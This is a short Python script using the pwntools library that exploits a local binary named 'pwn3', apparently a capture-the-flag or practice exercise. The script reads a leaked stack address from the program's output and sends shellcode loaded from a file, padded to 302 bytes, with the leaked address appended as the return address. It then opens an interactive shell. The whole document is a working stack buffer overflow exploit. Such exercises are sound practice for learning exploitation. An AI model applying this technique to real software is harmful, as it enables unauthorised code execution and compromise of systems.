from pwn import *

context.clear(arch='amd64')
context.terminal = ['alacritty', '-e', 'sh', '-c']

io = process('./pwn3')
e = ELF('./pwn3')

io.recvuntil("journey ")
leak = io.recvline()
input_address = int(leak.strip()[:-1], 16)

payload = open("../../payloads/shellcode32/payload", mode="rb").read()
payload += b"0"*(302 - len(payload))
payload += pack(input_address, 32, 'little')

io.sendline(payload)

io.interactive()
